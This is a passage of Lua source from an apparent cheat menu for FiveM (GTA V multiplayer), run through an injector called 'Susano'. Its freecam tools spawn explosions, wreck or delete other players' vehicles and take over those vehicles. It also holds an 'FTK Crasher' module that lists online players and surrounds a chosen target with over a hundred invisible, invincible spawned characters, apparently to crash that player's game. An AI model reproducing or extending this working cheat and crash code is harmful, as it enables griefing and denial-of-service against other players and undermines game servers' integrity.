            fc.pos = vector3(endCoords.x, endCoords.y, endCoords.z + 1.0)
            SetCamCoord(fc.cam, fc.pos.x, fc.pos.y, fc.pos.z)
        end
    elseif feat == "Teleport" then
        if lmbPressed and hit and not fc.tpBusy then
            fc.tpBusy = true
            local tpCoords = vector3(endCoords.x, endCoords.y, endCoords.z)
            local tpEntity = entityHit
            Citizen.CreateThread(function()
                local tped = PlayerPedId()
                FreezeEntityPosition(tped, false)
                SetEntityCollision(tped, true, true)
                SetEntityVisible(tped, true, false)
                ResetEntityAlpha(tped)
                if tpEntity ~= 0 and IsEntityAVehicle(tpEntity) then
                    local seat = vortex_fcGetEmptySeat(tpEntity)
                    TaskWarpPedIntoVehicle(tped, tpEntity, seat)
                else
                    SetEntityCoords(tped, tpCoords.x, tpCoords.y, tpCoords.z + 0.5, false, false, false, false)
                end
                Citizen.Wait(250)
                FreezeEntityPosition(tped, true)
                SetEntityCollision(tped, false, false)
                SetEntityVisible(tped, false, false)
                SetEntityInvincible(tped, true)
                SetEntityAlpha(tped, 0, false)
                if _G.vortexFreecam then _G.vortexFreecam.tpBusy = false end
            end)
        end
    elseif feat == "Shoot" then
        if lmbPressed then
            local sped = PlayerPedId()
            local wm = fc.pistolModels[fc.currentModelIndex].model
            local wh = GetHashKey(wm)
            GiveWeaponToPed(sped, wh, 255, false, true)
            SetCurrentPedWeapon(sped, wh, true)
            local dmg = (wm == "weapon_stungun") and 0 or 100
            ShootSingleBulletBetweenCoords(fc.pos.x, fc.pos.y, fc.pos.z, rEx, rEy, rEz, dmg, true, wh, sped, true, false, 1000.0)
        end
    elseif feat == "Shoot Car" then
        if lmbPressed then vortex_fcShootCar(vector3(fwdX, fwdY, fwdZ)) end
    elseif feat == "Spawn Bomb" then
        if lmbPressed and hit then vortex_fcSpawnBomb(endCoords) end
    elseif feat == "Blackhole" then
        fc.blackholeFrameCount = fc.blackholeFrameCount + 1
        local shouldUpdate = (fc.blackholeFrameCount % 3 == 0)
        if lmbDown and shouldUpdate then
            local pool = GetGamePool("CVehicle")
            if pool then
                local maxDSq = 40000.0
                local count = 0
                for _, veh in pairs(pool) do
                    if count >= 45 then break end
                    if veh and DoesEntityExist(veh) and IsEntityAVehicle(veh) then
                        local vc = GetEntityCoords(veh)
                        local dx = fc.pos.x - vc.x
                        local dy = fc.pos.y - vc.y
                        local dz = fc.pos.z - vc.z
                        local dSq = dx * dx + dy * dy + dz * dz
                        if dSq < maxDSq and dSq > 0.01 then
                            local d = math.sqrt(dSq)
                            local pull = math.min(350.0, 600.0 / math.max(d, 1.0))
                            if not fc.blackholeControlledVehicles[veh] then
                                NetworkRequestControlOfEntity(veh)
                                fc.blackholeControlledVehicles[veh] = true
                            end
                            ApplyForceToEntity(veh, 3, dx/d*pull, dy/d*pull, dz/d*pull, 0, 0, 0, 0, false, true, true, false, true)
                            count = count + 1
                        end
                    end
                end
            end
        end
        if fc.blackholePressed and not lmbDown then
            local pool = GetGamePool("CVehicle")
            if pool then
                for _, veh in pairs(pool) do
                    if veh and DoesEntityExist(veh) and IsEntityAVehicle(veh) then
                        local vc = GetEntityCoords(veh)
                        local dx = fc.pos.x - vc.x
                        local dy = fc.pos.y - vc.y
                        local dz = fc.pos.z - vc.z
                        if dx*dx + dy*dy + dz*dz < 2500.0 then
                            NetworkRequestControlOfEntity(veh)
                            ApplyForceToEntity(veh, 3, fwdX*320, fwdY*320, fwdZ*320, 0, 0, 0, 0, false, true, true, false, true)
                        end
                    end
                end
            end
            fc.blackholeControlledVehicles = {}
        end
        fc.blackholePressed = lmbDown
    elseif feat == "Kick Vehicle" then
        if lmbPressed and hit and entityHit ~= 0 and IsEntityAVehicle(entityHit) then
            local driver = GetPedInVehicleSeat(entityHit, -1)
            if driver and driver ~= 0 and DoesEntityExist(driver) then
                TaskLeaveVehicle(driver, entityHit, 0)
                SetPedCanRagdoll(driver, true)
                SetPedToRagdoll(driver, 1000, 1000, 0, 0, 0, 0)
            end
        end
    elseif feat == "Delete Vehicle" then
        if lmbPressed and hit and entityHit ~= 0 and IsEntityAVehicle(entityHit) then
            local targetVeh = entityHit
            Citizen.CreateThread(function()
                NetworkRequestControlOfEntity(targetVeh)
                Citizen.Wait(100)
                if DoesEntityExist(targetVeh) then
                    SetEntityAsMissionEntity(targetVeh, true, true)
                    DeleteEntity(targetVeh)
                    DeleteVehicle(targetVeh)
                end
            end)
        end
    elseif feat == "Fuck Vehicle" then
        if lmbPressed and hit and entityHit ~= 0 and IsEntityAVehicle(entityHit) then
            local targetVeh = entityHit
            Citizen.CreateThread(function()
                NetworkRequestControlOfEntity(targetVeh)
                Citizen.Wait(100)
                if DoesEntityExist(targetVeh) then
                    for i = 0, 7 do SetVehicleTyreBurst(targetVeh, i, true, 1000.0) end
                    SetVehicleEngineHealth(targetVeh, -4000.0)
                    for i = 0, 5 do SetVehicleDoorBroken(targetVeh, i, true) end
                    for i = 0, 7 do SmashVehicleWindow(targetVeh, i) end
                    StartEntityFire(targetVeh)
                end
            end)
        end
    elseif feat == "RC Control Car" then
        if lmbPressed and hit and entityHit ~= 0 and IsEntityAVehicle(entityHit) then
            local targetVeh = entityHit
            Citizen.CreateThread(function()
                NetworkRequestControlOfEntity(targetVeh)
                Citizen.Wait(100)
                if not DoesEntityExist(targetVeh) then return end
                _G.rcCarControl = targetVeh
                _G.rcCarControlActive = true
                _G.rcCarControlSpeed = 0.0
                SetEntityAsMissionEntity(targetVeh, true, true)
                SetEntityInvincible(targetVeh, true)
                SetVehicleEngineOn(targetVeh, true, true, false)
                SetEntityHasGravity(targetVeh, true)
                FreezeEntityPosition(targetVeh, false)
                SetEntityCollision(targetVeh, true, true)
                SetEntityCanBeDamaged(targetVeh, false)
                SetVehicleCanBeVisiblyDamaged(targetVeh, false)
                SetVehicleOnGroundProperly(targetVeh)
                local fc2 = _G.vortexFreecam
                if fc2 and fc2.cam and DoesCamExist(fc2.cam) then
                    SetCamActive(fc2.cam, false)
                end
                _G.rcCameraControl = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                AttachCamToEntity(_G.rcCameraControl, targetVeh, 0.0, -2.5, 1.5, true)
                SetCamRot(_G.rcCameraControl, -5.0, 0.0, GetEntityHeading(targetVeh), 2)
                SetCamActive(_G.rcCameraControl, true)
                RenderScriptCams(true, true, 1000, true, true)
            end)
        end
    end
end

------------------------------------------------------------
-- Feature : Shoot Car
------------------------------------------------------------
function vortex_fcShootCar(dir)
    local fc = _G.vortexFreecam
    if not fc then return end
    local from = fc.pos
    local rot_z = math.deg(math.atan(dir.x, dir.y)) * -1.0
    local rot_x = math.deg(math.asin(dir.z))
    local targetPoint = from + dir * 500.0
    local model = fc.vehicleModels[fc.currentVehicleIndex].model
    local modelHash = GetHashKey(model)

    Citizen.CreateThread(function()
        RequestModel(modelHash)
        local t = 0
        while not HasModelLoaded(modelHash) and t < 100 do Citizen.Wait(10); t = t + 1 end
        if not HasModelLoaded(modelHash) then return end

        local spawnCoords = from + dir * 3.0 + vector3(0, 0, 1.0)
        local veh = CreateVehicle(modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, rot_z, true, true)

        if veh and DoesEntityExist(veh) then
            SetEntityAsMissionEntity(veh, true, true)
            SetVehicleEngineOn(veh, true, true, false)
            SetVehicleForwardSpeed(veh, 0.0)
            SetEntityRotation(veh, rot_x, 0.0, rot_z, 2, true)

            Citizen.Wait(75)
            if DoesEntityExist(veh) then
                local shootDir = targetPoint - from
                local dist = math.max(#shootDir, 1.0)
                local norm = shootDir / dist
                local baseForce = (model == "luxor" or model == "luxor2") and 320.0 or 220.0
                local vertBoost = (model == "luxor" or model == "luxor2") and 25.0 or 12.5
                for _ = 1, 3 do
                    ApplyForceToEntity(veh, 1, norm.x * baseForce, norm.y * baseForce, norm.z * baseForce + vertBoost, 0, 0, 0, 0, false, true, true, false, true)
                    Citizen.Wait(0)
                end
            end
        end
        SetModelAsNoLongerNeeded(modelHash)
    end)
end

------------------------------------------------------------
-- Feature : Spawn Bomb
------------------------------------------------------------
function vortex_fcSpawnBomb(explosionCoords)
    local fc = _G.vortexFreecam
    if not fc then return end
    local explosionType = fc.explosionTypes[fc.currentExplosionIndex].type

    if explosionType == "default" then
        Citizen.CreateThread(function()
            local model = "prop_aircon_m_04"
            local sx, sy, sz = explosionCoords.x, explosionCoords.y, explosionCoords.z - 1.0
            RequestModel(model)
            while not HasModelLoaded(model) do Citizen.Wait(0) end
            local obj = CreateObjectNoOffset(model, sx, sy, sz, true, true, false)
            if obj and DoesEntityExist(obj) then
                NetworkRegisterEntityAsNetworked(obj)
                local netId = ObjToNet(obj)
                SetNetworkIdExistsOnAllMachines(netId, true)
                SetNetworkIdCanMigrate(netId, true)
                PlaceObjectOnGroundProperly(obj)
                SetEntityVisible(obj, false, false)
                SetEntityCollision(obj, false, false)
                FreezeEntityPosition(obj, true)
                local pos = GetEntityCoords(obj)
                local fireIds = {}
                local offsets = { {0,0,0}, {0.35,0,0}, {-0.35,0,0}, {0,0.35,0}, {0,-0.35,0} }
                for _, off in ipairs(offsets) do
                    local id = StartScriptFire(pos.x + off[1], pos.y + off[2], pos.z + off[3], 25, false)
                    if id and id ~= -1 then fireIds[#fireIds + 1] = id end
                end
                local entFire = StartEntityFire(obj)
                local timeout2 = GetGameTimer() + 10000
                while GetGameTimer() < timeout2 and DoesEntityExist(obj) do Citizen.Wait(200) end
                for _, fid in ipairs(fireIds) do RemoveScriptFire(fid) end
                if entFire and entFire ~= -1 then RemoveScriptFire(entFire) end
                StopEntityFire(obj)
                if DoesEntityExist(obj) then DeleteObject(obj) end
                SetModelAsNoLongerNeeded(model)
            end
        end)
    else
        Citizen.CreateThread(function()
            local model = ""
            if explosionType == "car" then model = "adder"
            elseif explosionType == "plane" then model = "nimbus"
            elseif explosionType == "boat" then model = "dinghy"
            elseif explosionType == "heli" then model = "frogger"
            end
            if model == "" then return end
            RequestModel(model)
            while not HasModelLoaded(model) do Citizen.Wait(1) end
            local vehicle = CreateVehicle(GetHashKey(model), explosionCoords.x, explosionCoords.y, explosionCoords.z, 0.0, true, true)
            while not DoesEntityExist(vehicle) do Citizen.Wait(1) end
            SetEntityCollision(vehicle, false, false)
            FreezeEntityPosition(vehicle, true)
            NetworkExplodeVehicle(vehicle, true, false, false)
            Citizen.Wait(500)
            if DoesEntityExist(vehicle) then DeleteEntity(vehicle) end
            SetModelAsNoLongerNeeded(model)
        end)
    end
end

------------------------------------------------------------
-- RC Car
------------------------------------------------------------
function vortex_fcHandleRCCar()
    local vehicle = _G.rcCarControl
    if not vehicle or not DoesEntityExist(vehicle) then
        _G.rcCarControlActive = false
        _G.rcCarControl = nil
        if _G.rcCameraControl then
            RenderScriptCams(false, true, 500, true, true)
            DestroyCam(_G.rcCameraControl, false)
            _G.rcCameraControl = nil
        end
        -- Retour camera freecam
        local fc2 = _G.vortexFreecam
        if fc2 and fc2.isToggled and fc2.cam and DoesCamExist(fc2.cam) then
            SetCamActive(fc2.cam, true)
            RenderScriptCams(true, false, 0, true, true)
        end
        return
    end

    -- Re-activer les controles vehicule pour RC
    EnableControlAction(0, 71, true)
    EnableControlAction(0, 72, true)
    EnableControlAction(0, 63, true)
    EnableControlAction(0, 64, true)
    EnableControlAction(0, 73, true)

    SetVehicleEngineOn(vehicle, true, true, false)
    SetEntityInvincible(vehicle, true)
    FreezeEntityPosition(vehicle, false)
    SetEntityHasGravity(vehicle, true)
    SetEntityCollision(vehicle, true, true)

    local fwd = 0.0
    if IsControlPressed(0, 71) then fwd = 1.0
    elseif IsControlPressed(0, 72) then fwd = -1.0 end

    local steer = 0.0
    if IsControlPressed(0, 64) then steer = -1.0
    elseif IsControlPressed(0, 63) then steer = 1.0 end

    local hdg = GetEntityHeading(vehicle)
    local maxSpd, acc, dec = 50.0, 2.5, 3.0

    if fwd ~= 0.0 then
        local target = maxSpd * fwd
        if fwd > 0 then
            _G.rcCarControlSpeed = math.min((_G.rcCarControlSpeed or 0) + acc, target)
        else
            _G.rcCarControlSpeed = math.max((_G.rcCarControlSpeed or 0) - dec, target)
        end
        SetVehicleForwardSpeed(vehicle, _G.rcCarControlSpeed)
        if steer ~= 0.0 then
            local sf = math.min(math.abs(_G.rcCarControlSpeed) / 20.0, 1.0)
            local turn = steer * (math.abs(_G.rcCarControlSpeed) > 1.0 and sf * 4.5 or 2.0)
            SetEntityHeading(vehicle, hdg + turn)
        end
    else
        if math.abs(_G.rcCarControlSpeed or 0) > 0.1 then
            _G.rcCarControlSpeed = _G.rcCarControlSpeed > 0 and math.max(_G.rcCarControlSpeed - dec, 0) or math.min(_G.rcCarControlSpeed + dec, 0)
            SetVehicleForwardSpeed(vehicle, _G.rcCarControlSpeed)
        else
            _G.rcCarControlSpeed = 0.0
        end
    end

    local vc = GetEntityCoords(vehicle)
    local found, gz = GetGroundZFor_3dCoord(vc.x, vc.y, vc.z + 10.0, 0.0, false)
    if found and vc.z - gz > 0.5 then
        SetVehicleOnGroundProperly(vehicle)
    end

    if _G.rcCameraControl then
        SetCamRot(_G.rcCameraControl, -5.0, 0.0, GetEntityHeading(vehicle), 2)
        SetFocusPosAndVel(vc.x, vc.y, vc.z, 0.0, 0.0, 0.0)
    end

    -- Sortir RC (touche X / control 73)
    if IsControlJustPressed(0, 73) then
        if _G.rcCameraControl then
            DestroyCam(_G.rcCameraControl, false)
            _G.rcCameraControl = nil
        end
        _G.rcCarControlActive = false
        _G.rcCarControl = nil
        -- Retour a la freecam
        local fc2 = _G.vortexFreecam
        if fc2 and fc2.isToggled then
            fc2.pos = vector3(vc.x, vc.y, vc.z + 5.0)
            if fc2.cam and DoesCamExist(fc2.cam) then
                SetCamCoord(fc2.cam, fc2.pos.x, fc2.pos.y, fc2.pos.z)
                SetCamActive(fc2.cam, true)
                RenderScriptCams(true, false, 0, true, true)
            end
        end
    end
end


-- Forward-declare FTK table (used outside this scope)
local FTK
do -- BEGIN FTK scope
FTK = {}

-- Localize globals used heavily for a small perf win
local _CreateThread = Citizen.CreateThread
local _Wait = Citizen.Wait
local _PlayerPedId = PlayerPedId

FTK.Config = {
    pedModel = "player_one",
    spawnRadius = 4.5,
    totalPeds = 110,
    spawnDelay = 200,
    lifetimeDuration = 3500,
    batchSize = 6,
}

FTK.SpawnState = { active = false, executed = false, entities = {} }
FTK.MenuState = { isOpen = false, selectedIndex = 1, playerList = {}, scrollOffset = 0, maxVisible = 10 }

function FTK.RefreshPlayerList()
    FTK.MenuState.playerList = {}
    for _, playerId in ipairs(GetActivePlayers()) do
        if playerId ~= PlayerId() then
            local playerPed = GetPlayerPed(playerId)
            if DoesEntityExist(playerPed) then
                local serverID = GetPlayerServerId(playerId)
                local playerName = GetPlayerName(playerId)
                local distance = #(GetEntityCoords(PlayerPedId()) - GetEntityCoords(playerPed))
                table.insert(FTK.MenuState.playerList, { id = playerId, serverId = serverID, name = playerName, distance = distance })
            end
        end
    end
    table.sort(FTK.MenuState.playerList, function(a,b) return a.distance < b.distance end)
end

local function FTK_DrawText3D(text, x, y, scale, font)
    SetTextFont(font or 4)
    SetTextProportional(0)
    SetTextScale(scale, scale)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow(0, 0, 0, 0, 255)
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x, y)
end

function FTK.DrawMenu()
    if not FTK.MenuState.isOpen then return end
    local screenW, screenH = GetActiveScreenResolution()
    local baseX, baseY, width = 0.20, 0.25, 0.25
    local headerHeight, itemHeight = 0.03, 0.025
    DrawRect(baseX + width/2, baseY + 0.25, width, 0.52, 0,0,0,200)
    DrawRect(baseX + width/2, baseY + headerHeight/2, width, headerHeight, 0,0,0,0)
    FTK_DrawText3D("~b~FTK Crasher V2.0 [Beta]", baseX + 0.05, baseY - 0.01, 0.7, 4)
    FTK_DrawText3D("~w~Created By: Rev & Eleven", baseX + 0.08, baseY + 0.035, 0.35, 1)
    local instrY = baseY + headerHeight + 0.035
    FTK_DrawText3D("~b~[F3] Open/Close | [ENTER] Select | [ARROWS] Navigate", baseX + 0.030, instrY, 0.40, 4)
    local crowdY = instrY + 0.04
    local crowdColor = FTK.MenuState.selectedIndex == 0 and "~b~â†’ " or "~w~   "
    FTK_DrawText3D(crowdColor .. "FTK Crasher V1 (Crowd Crash)", baseX + 0.07, crowdY, 0.40, 4)
    DrawRect(baseX + width/2, crowdY + 0.040, width - 0.01, 0.002, 250,250,255,255)
    local listHeaderY = crowdY + 0.05
    FTK_DrawText3D("~b~Online Players:", baseX + 0.10, listHeaderY, 0.40, 4)

    if #FTK.MenuState.playerList == 0 then
        FTK_DrawText3D("~w~           No Players Found. Press [RIGHTCTRL] To Refresh List.", baseX + 0.004, listHeaderY + 0.04, 0.40, 4)
        return
    end

    local startY = listHeaderY + 0.04
    local visibleStart = FTK.MenuState.scrollOffset
    local visibleEnd = math.min(FTK.MenuState.scrollOffset + FTK.MenuState.maxVisible, #FTK.MenuState.playerList)
    for i = visibleStart + 1, visibleEnd do
        local player = FTK.MenuState.playerList[i]
        local yPos = startY + ((i - visibleStart - 1) * itemHeight)
        local isSelected = FTK.MenuState.selectedIndex == i
        local prefix = isSelected and "~b~â†’ " or "~w~   "
        local distText = string.format("%.0fm", player.distance)
        local displayText = string.format("%s[%d] %s ~c~(%s)", prefix, player.serverId, player.name, distText)
        FTK_DrawText3D(displayText, baseX + 0.09, yPos, 0.35, 4)
    end

    if #FTK.MenuState.playerList > FTK.MenuState.maxVisible then
        local scrollY = startY + (FTK.MenuState.maxVisible * itemHeight) + 0.02
        FTK_DrawText3D(string.format("~y~Showing %d-%d of %d", visibleStart + 1, visibleEnd, #FTK.MenuState.playerList), baseX + 0.005, scrollY, 0.3, 4)
    end
end

function FTK.HandleMenuInput()
    if not FTK.MenuState.isOpen then return end
    if IsControlJustPressed(0, 172) then -- up
        FTK.MenuState.selectedIndex = FTK.MenuState.selectedIndex - 1
        if FTK.MenuState.selectedIndex < 0 then FTK.MenuState.selectedIndex = #FTK.MenuState.playerList end
        if FTK.MenuState.selectedIndex < FTK.MenuState.scrollOffset + 1 then FTK.MenuState.scrollOffset = math.max(0, FTK.MenuState.selectedIndex - 1) end
    end
    if IsControlJustPressed(0, 173) then -- down
        FTK.MenuState.selectedIndex = FTK.MenuState.selectedIndex + 1
        if FTK.MenuState.selectedIndex > #FTK.MenuState.playerList then FTK.MenuState.selectedIndex = 0 end
        if FTK.MenuState.selectedIndex > FTK.MenuState.scrollOffset + FTK.MenuState.maxVisible then FTK.MenuState.scrollOffset = FTK.MenuState.selectedIndex - FTK.MenuState.maxVisible end
    end
    if IsControlJustPressed(0, 191) then -- enter
        if FTK.MenuState.selectedIndex == 0 then
            FTK.MenuState.isOpen = false
            FTK.ExecuteSpawn(nil)
        elseif FTK.MenuState.selectedIndex > 0 and FTK.MenuState.selectedIndex <= #FTK.MenuState.playerList then
            local target = FTK.MenuState.playerList[FTK.MenuState.selectedIndex]
            FTK.MenuState.isOpen = false
            FTK.ExecuteSpawn(target.id)
        end
    end
    if IsControlJustPressed(0, 70) then -- refresh
        FTK.RefreshPlayerList()
        FTK.MenuState.selectedIndex = math.min(FTK.MenuState.selectedIndex, #FTK.MenuState.playerList)
    end
end

function FTK.LocateNearestPlayer()
    local myPed = PlayerPedId()
    local myPos = GetEntityCoords(myPed)
    local nearestId, shortestDist = nil, math.huge
    for _, id in pairs(GetActivePlayers()) do
        if id ~= PlayerId() then
            local theirPed = GetPlayerPed(id)
            if DoesEntityExist(theirPed) and NetworkIsPlayerActive(id) then
                local dist = #(myPos - GetEntityCoords(theirPed))
                if dist < shortestDist then shortestDist, nearestId = dist, id end
            end
        end
    end
    return nearestId
end

function FTK.ConfigurePed(ped, playerPed)
    SetEntityAlpha(ped, 0, false)
    SetEntityVisible(ped, false, false)
    FreezeEntityPosition(ped, true)
    SetEntityCollision(ped, false, false)
    SetEntityCompletelyDisableCollision(ped, false, false)
    SetEntityNoCollisionEntity(ped, playerPed, true)
    SetEntityNoCollisionEntity(playerPed, ped, true)
    SetEntityCanBeDamaged(ped, false)
    SetEntityInvincible(ped, true)
    SetEntityProofs(ped, true, true, true, true, true, true, true, true)
    SetPedCanRagdoll(ped, false)
    SetPedCanRagdollFromPlayerImpact(ped, false)
    local flags = {17,128,149,223,229,281,287,292,297,301,430,435}
    for _, flag in ipairs(flags) do SetPedConfigFlag(ped, flag, true) end
    SetBlockingOfNonTemporaryEvents(ped, true)
    SetPedFleeAttributes(ped, 0, false)
    SetPedAsEnemy(ped, false)
    local combatAttrs = {0,5,17,46}
    for _, attr in ipairs(combatAttrs) do SetPedCombatAttributes(ped, attr, false) end
    SetPedCombatAbility(ped, 0)
    SetPedCombatRange(ped, 0)
    SetPedCombatMovement(ped, 0)
    DisablePedPainAudio(ped, true)
    SetPedMute(ped, true)
    StopPedSpeaking(ped, true)
    SetPedSeeingRange(ped, 0.0)
    SetPedHearingRange(ped, 0.0)
    SetPedAlertness(ped, 0)
end

function FTK.CalculateSpawnPosition(centerCoords, radius)
    local angle = math.random() * 2 * math.pi
    local distance = math.random() * radius
    local x = centerCoords.x + (distance * math.cos(angle))
    local y = centerCoords.y + (distance * math.sin(angle))
    local z = centerCoords.z
    local hasGround, groundZ = GetGroundZFor_3dCoord(x, y, z + 2.0, false)
    if hasGround then z = groundZ end
    return vector3(x,y,z)
end

function FTK.CleanupEntities()
    for _, entity in ipairs(FTK.SpawnState.entities) do if DoesEntityExist(entity) then DeleteEntity(entity) end end
    FTK.SpawnState.entities = {}
end

function FTK.ExecuteSpawn(targetPlayerId)
    if FTK.SpawnState.active then return end
    FTK.SpawnState.active = true
    if not targetPlayerId then targetPlayerId = FTK.LocateNearestPlayer() end
    if not targetPlayerId then print("^3[FTK] No target found^0") FTK.SpawnState.active = false return end
    local targetName = GetPlayerName(targetPlayerId)
    local targetServer = GetPlayerServerId(targetPlayerId)
    print(string.format("^2[FTK] Targeting: [%d] %s^0", targetServer, targetName))
    local modelHash = GetHashKey(FTK.Config.pedModel)
    RequestModel(modelHash)
    local timeout = 0
    while not HasModelLoaded(modelHash) and timeout < 50 do _Wait(100) timeout = timeout + 1 end
    if not HasModelLoaded(modelHash) then print("^1[FTK] Failed to load model^0") FTK.SpawnState.active = false return end
    local iterations = math.ceil(FTK.Config.totalPeds / FTK.Config.batchSize)
    for iteration = 1, iterations do
        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) or not NetworkIsPlayerActive(targetPlayerId) then FTK.CleanupEntities() SetModelAsNoLongerNeeded(modelHash) FTK.SpawnState.active = false print("^3[FTK] Target disconnected^0") return end
        local targetCoords = GetEntityCoords(targetPed)
        for i = 1, FTK.Config.batchSize do
            local spawnPos = FTK.CalculateSpawnPosition(targetCoords, FTK.Config.spawnRadius)
            local heading = math.random(0, 359)
            local entity = CreatePed(28, modelHash, spawnPos.x, spawnPos.y, spawnPos.z, heading, true, false)
                if DoesEntityExist(entity) then
                    FTK.ConfigurePed(entity, _PlayerPedId())
                TaskWanderInArea(entity, spawnPos.x, spawnPos.y, spawnPos.z, 8.0, 8.0, 8.0)
                SetPedAsNoLongerNeeded(entity)
                table.insert(FTK.SpawnState.entities, entity)
            end
        end
        Citizen.Wait(FTK.Config.spawnDelay)
    end
    SetModelAsNoLongerNeeded(modelHash)
    print("^2[FTK] Crasher executed successfully^0")
    Citizen.CreateThread(function() Citizen.Wait(FTK.Config.lifetimeDuration) FTK.CleanupEntities() FTK.SpawnState.active = false end)
end

-- FTK display thread
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if FTK.MenuState.isOpen then FTK.DrawMenu() FTK.HandleMenuInput() end
    end
end)

-- Toggle with F3 (also supports opening by menu action)
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if IsControlJustPressed(0, 170) then -- F3
            FTK.MenuState.isOpen = not FTK.MenuState.isOpen
            if FTK.MenuState.isOpen then FTK.RefreshPlayerList() FTK.MenuState.selectedIndex = 0 FTK.MenuState.scrollOffset = 0 end
        end
    end
end)

print("^5[FTK CRASHER] Module loaded into Vortex Menu^0")
end -- END FTK scope


local VortexBanner = {
    enabled = true,
    imageUrl = vortex_themes[vortex_currentTheme].banner,
    text = "SUSANO MENU",
    subtitle = "Premium Edition",
    height = 110
}

local vortex_bannerTexture = nil
local vortex_bannerWidth = 0
local vortex_bannerHeight = 0

-- Draw a label (simplified â€” icons removed from labels)
local function Vortex_DrawIconLabel(x, y, label, fontSize, r, g, b, a)
    if not label or label == "" then return end
    Susano.DrawText(x, y, label, fontSize, r, g, b, a)
end

-- Get the total width of a label
local function Vortex_GetIconLabelWidth(label, fontSize)
    if not label then return 0 end
    return Susano.GetTextWidth(label, fontSize)
end

-- Forward-declare icon system vars used outside the block
local vortex_iconTextures = {}
local Vortex_LoadIconTextures
local Vortex_DrawItemIcon

do -- Icon System scope block (saves top-level locals)
-- ============================================================
-- Icon System â€” Downloads Material Design icon PNGs from
-- jsdelivr CDN, loads them as Susano textures, and renders
-- them with DrawImage. Same approach as the logo system.
-- ============================================================
local vortex_iconsLoaded = false
local vortex_iconsLoading = false

local VORTEX_ICON_CDN = "https://cdn.jsdelivr.net/npm/material-design-icons@3.0.1"

-- Map internal icon names to Material Design Icons CDN paths
local vortex_iconURLs = {
    person    = VORTEX_ICON_CDN .. "/action/drawable-xxhdpi/ic_account_circle_white_48dp.png",
    globe     = VORTEX_ICON_CDN .. "/social/drawable-xxhdpi/ic_public_white_48dp.png",
    eye       = VORTEX_ICON_CDN .. "/action/drawable-xxhdpi/ic_visibility_white_48dp.png",
    crosshair = VORTEX_ICON_CDN .. "/device/drawable-xxhdpi/ic_gps_fixed_white_48dp.png",
    weapon    = VORTEX_ICON_CDN .. "/hardware/drawable-xxhdpi/ic_gamepad_white_48dp.png",
    car       = VORTEX_ICON_CDN .. "/maps/drawable-xxhdpi/ic_directions_car_white_48dp.png",
    gear      = VORTEX_ICON_CDN .. "/action/drawable-xxhdpi/ic_settings_white_48dp.png",
    shield    = VORTEX_ICON_CDN .. "/action/drawable-xxhdpi/ic_verified_user_white_48dp.png",
    search    = VORTEX_ICON_CDN .. "/action/drawable-xxhdpi/ic_search_white_48dp.png",
    crown     = VORTEX_ICON_CDN .. "/toggle/drawable-xxhdpi/ic_star_white_48dp.png",
    edit      = VORTEX_ICON_CDN .. "/editor/drawable-xxhdpi/ic_mode_edit_white_48dp.png",
    palette   = VORTEX_ICON_CDN .. "/image/drawable-xxhdpi/ic_palette_white_48dp.png",
    bolt      = VORTEX_ICON_CDN .. "/image/drawable-xxhdpi/ic_flash_on_white_48dp.png",
}

-- Load all icon textures from CDN (called once at startup)
Vortex_LoadIconTextures = function()
    if vortex_iconsLoaded or vortex_iconsLoading then return end
    if not Susano or not Susano.HttpGet or not Susano.LoadTextureFromBuffer then return end
    vortex_iconsLoading = true

    Citizen.CreateThread(function()
        local loaded = 0
        local total = 0
        for _ in pairs(vortex_iconURLs) do total = total + 1 end

        for name, url in pairs(vortex_iconURLs) do
            local ok = pcall(function()
                local status, body = Susano.HttpGet(url)
                if status == 200 and body and #body > 50 then
                    local textureId, w, h = Susano.LoadTextureFromBuffer(body)
                    if textureId and textureId ~= 0 then
                        vortex_iconTextures[name] = textureId
                        loaded = loaded + 1
                    end
                end
            end)
            Citizen.Wait(50)  -- small delay between downloads to avoid flooding
        end

        vortex_iconsLoaded = true
        vortex_iconsLoading = false
    end)
end

-- Draw an icon texture at position (x, y) with given size and tint color
Vortex_DrawItemIcon = function(iconName, x, y, size, r, g, b, a)
    if not iconName then return 0 end
    local tex = vortex_iconTextures[iconName]
    if not tex then return 0 end

    local iconSz = size + 2
    local pad = 3
    local bgSize = iconSz + pad * 2

    -- Draw subtle rounded background behind the icon
    Susano.DrawRectFilled(x - pad, y - pad, bgSize, bgSize, r * 0.12, g * 0.12, b * 0.12, 0.5, bgSize * 0.3)

    -- Draw the icon texture (tinted with accent color)
    pcall(Susano.DrawImage, tex, x, y, iconSz, iconSz, r, g, b, a, 0.0)

    return bgSize + 4  -- total width consumed (icon + spacing)
end
end -- end Icon System scope block

-- ============================================================
-- Logo Texture System â€” Downloads the Vortex logo for the
-- loading screen and menu header from a CDN at startup.
-- ============================================================
-- Forward-declare logo/banner system vars used outside
local vortex_logoTexture = nil
local vortex_logoLoaded = false
local Vortex_LoadLogoTexture
local Vortex_LoadBannerTexture

do -- Logo/Banner Texture scope block
local vortex_logoURLs = {
    "https://i.imgur.com/placeholder_vortex_logo.png",  -- Replace with actual logo URL
}

local VORTEX_LOGO_URL = nil  -- Set to your logo image URL string

Vortex_LoadLogoTexture = function()
    if vortex_logoLoaded then return true end
    if not Susano or not Susano.HttpGet or not Susano.LoadTextureFromBuffer then return false end

    local url = VORTEX_LOGO_URL
    if not url or url == "" then return false end

    local ok, _ = pcall(function()
        local status, body = Susano.HttpGet(url)
        if status == 200 and body and #body > 100 then
            local textureId, w, h = Susano.LoadTextureFromBuffer(body)
            if textureId and textureId ~= 0 then
                vortex_logoTexture = textureId
                vortex_logoLoaded = true
            end
        end
    end)
    return vortex_logoLoaded
end

Vortex_LoadBannerTexture = function(url)
    if not url or url == "" then return end
    if not Susano or not Susano.HttpGet or not Susano.LoadTextureFromBuffer then return end

    Citizen.CreateThread(function()
        local success, result = pcall(function()
            local status, body = Susano.HttpGet(url)
            if status == 200 and body and #body > 0 then
                local textureId, width, height = Susano.LoadTextureFromBuffer(body)
                if textureId and textureId ~= 0 then
                    vortex_bannerTexture = textureId
                    vortex_bannerWidth = width
                    vortex_bannerHeight = height
                    return textureId
                end
            end
            return nil
        end)
    end)
end
end -- end Logo/Banner scope block





local VortexStyle = {
    x = 70,
    y = 100,
    width = 320,
